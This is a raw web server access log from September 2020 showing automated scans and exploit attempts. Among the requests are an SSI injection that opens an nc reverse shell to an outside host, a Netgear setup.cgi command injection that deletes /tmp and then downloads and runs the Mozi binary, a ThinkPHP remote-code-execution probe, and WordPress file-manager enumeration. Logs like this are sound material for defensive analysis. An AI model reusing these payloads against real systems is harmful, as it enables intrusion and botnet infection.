192.241.238.10 - - [18/Sep/2020:03:02:52 +0900] "GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.1" 403 125 "-" "Mozilla/5.0 zgrab/0.x"
83.97.20.130 - - [18/Sep/2020:07:18:04 +0900] "GET /incl/image_test.shtml?camnbr=%3c%21--%23exec%20cmd=%22mkfifo%20/tmp/s;nc%20-w%205%2083.97.20.130%2029312%200%3C/tmp/s|/bin/sh%3E/tmp/s%202%3E/tmp/s;rm%20/tmp/s%22%20--%3e HTTP/1.0" 404 12830 "-" "-"
45.146.164.186 - - [18/Sep/2020:10:07:15 +0900] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 403 187 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.186 - - [18/Sep/2020:11:03:02 +0900] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 4339 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
115.99.191.87 - - [18/Sep/2020:12:57:08 +0900] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.99.191.87:33265/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 12830 "-" "-"
192.99.14.187 - - [18/Sep/2020:13:41:08 +0900] "GET //wordpress///wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36"
192.99.14.187 - - [18/Sep/2020:13:42:05 +0900] "GET //blog///wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 403 153 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14"
192.99.14.187 - - [18/Sep/2020:13:42:53 +0900] "GET //home///wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 403 153 "-" "Mozilla/5.0 (Windows NT 5.1; rv:30.0) Gecko/20100101 Firefox/30.0"
192.99.14.187 - - [18/Sep/2020:13:43:46 +0900] "GET //old///wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36"
192.99.14.187 - - [18/Sep/2020:13:44:35 +0900] "GET //demo///wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 403 153 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Safari/600.1.3"
192.99.14.187 - - [18/Sep/2020:13:47:41 +0900] "GET ///wp///wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36"
192.99.14.187 - - [18/Sep/2020:13:49:08 +0900] "GET ///wordpress///wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 403 153 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko"
